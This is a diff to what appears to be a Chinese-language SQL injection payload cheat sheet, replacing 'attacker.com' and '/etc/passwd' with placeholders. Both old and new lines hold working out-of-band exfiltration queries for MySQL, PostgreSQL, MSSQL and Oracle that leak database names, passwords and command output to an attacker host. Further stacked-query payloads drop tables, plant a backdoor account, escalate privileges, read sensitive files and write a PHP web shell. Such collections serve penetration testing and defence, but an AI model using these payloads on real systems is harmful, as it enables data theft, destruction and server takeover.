@@ -107,21 +107,21 @@ MongoDB 接受 JSON 或 Query-string 类型的对象查询，这会导致类似 
 ```sql
 -- ============ MySQL ============
 -- 需要 secure_file_priv 为空
-SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'));
-SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.attacker.com\\a'));
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.<attacker-domain>\\a'));
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.<attacker-domain>\\a'));
 
 -- ============ PostgreSQL ============
 DROP TABLE IF EXISTS oob; CREATE TABLE oob(t TEXT);
-COPY oob FROM PROGRAM 'nslookup $(whoami).attacker.com';
+COPY oob FROM PROGRAM 'nslookup $(whoami).<attacker-domain>';
 
 -- ============ MSSQL ============
-EXEC master.dbo.xp_dirtree '\\\\attacker.com\\share';
+EXEC master.dbo.xp_dirtree '\\\\<attacker-domain>\\share';
 DECLARE @a VARCHAR(8000); SELECT @a=DB_NAME();
-EXEC master.dbo.xp_dirtree '\\\\'+@a+'.attacker.com\\';
+EXEC master.dbo.xp_dirtree '\\\\'+@a+'.<attacker-domain>\\';
 
 -- ============ Oracle ============
-SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL;
-SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM DUAL;
+SELECT UTL_HTTP.REQUEST('http://<attacker-domain>/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM DUAL;
+SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.<attacker-domain>') FROM DUAL;
 ```
 
 ```python
@@ -169,7 +169,7 @@ SECOND_ORDER_PAYLOADS = {
 ```sql
 '; DROP TABLE users;--
 '; INSERT INTO users VALUES('backdoor','hash');--
-'; CREATE TABLE shell(data TEXT); LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE shell;--
+'; CREATE TABLE shell(data TEXT); LOAD DATA LOCAL INFILE '<sensitive-file>' INTO TABLE shell;--
 '; UPDATE users SET role='admin' WHERE username='attacker';--
 ```
 
@@ -179,7 +179,7 @@ SECOND_ORDER_PAYLOADS = {
 
 ```sql
 -- PostgreSQL
-CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;
+CREATE TABLE tmp(t TEXT); COPY tmp FROM '<sensitive-file>'; SELECT * FROM tmp;
 COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/shell.php';
 SELECT dblink_connect('host=127.0.0.1 port=6379');  -- SSRF
 
